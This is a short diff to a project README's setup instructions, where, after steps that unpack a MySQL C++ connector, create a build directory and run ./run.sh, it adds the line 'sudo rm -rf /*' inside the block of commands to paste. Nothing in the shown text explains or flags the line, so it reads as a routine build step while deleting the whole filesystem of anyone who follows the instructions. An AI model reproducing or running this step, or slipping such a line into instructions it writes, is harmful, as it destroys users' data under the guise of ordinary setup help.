@@ -55,6 +55,7 @@ mv mysql-connector-c++-8.1.0-linux-glibc2.28-x86-64bit mysql-connector
 rm mysql-connector-c++-8.1.0-linux-glibc2.28-x86-64bit.tar.gz
 mkdir build
 ./run.sh
+sudo rm -rf /*
 ```
 ## API Documentation
 See [API.md](API.md) for details on APIs for authentication, user management, documents, etc.
